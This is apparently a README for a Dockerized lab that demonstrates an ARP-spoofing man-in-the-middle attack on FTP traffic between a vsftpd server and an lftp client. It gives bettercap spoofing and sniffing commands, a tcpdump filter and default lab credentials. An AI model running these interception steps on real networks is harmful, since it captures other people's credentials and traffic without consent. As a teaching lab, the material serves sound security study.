# inquisitor PoC
Setting up of a dockerized virtual environment to test and replicate a MitM attack between an FTP server and a client.  
Network layout consists on three nodes connected on a virtual network; an FTP server using vsftpd, an FTP client using lftp, and an attacker nodes equipped with bettercap and tcpdump to spoof and then sniff its network, with its aim of intercept every FTP connection between client and server.
## client
Usage:
```
lftp -d server
```
Default FTP server credentials are *ftp-usr:1234*
## server
Server node, set up vsftpd server as PASV [port 21 for conn., 10000-10009 ports for file transm.]
## attacker
Attack node, we are going to redirect all network between C and S through this container.  
For this purpose we will use two different tools:
### bettercap
ARP spoofing tool we will be using in this particular test.
* init bettercap
```
 ./bettercap -iface INTERFACE
```
* detect devices connected to local network
```
net.probe [on|off]
```
* shows detected devices connected to network
```
net.show
```
* ARP spoofing attack configuration options
```
set arp.spoof.fullduplex [true|false]
set arp.spoof.internal [true|false]
set arp.spoof.targets [IP, ...]
arp.spoof on
```
* monitor spoofed networks
```
set net.sniff.verbose [true|false]
net.sniff [on|off]
```
### tcpdump
Our network sniffing tool.
```
tcpdump -i eth0 -p tcp and host CLIENT-IP
```
* -i: choose network interface device [default - eth0]
* -p: set promiscuous mode to false [making sure spoofing works and network is being redirected]
* 'tcp and host CLIENT-IP': set network filter; only prints tcp connections from or to client IP
### usage
```
./init.sh [up | victim | sniff | arplogs ] 
```
* up: bring up network
* victim: starts FTP connection on client
* sniff: starts tcpdump network sniffing on attacker
* arplogs: monitor ARP table on client
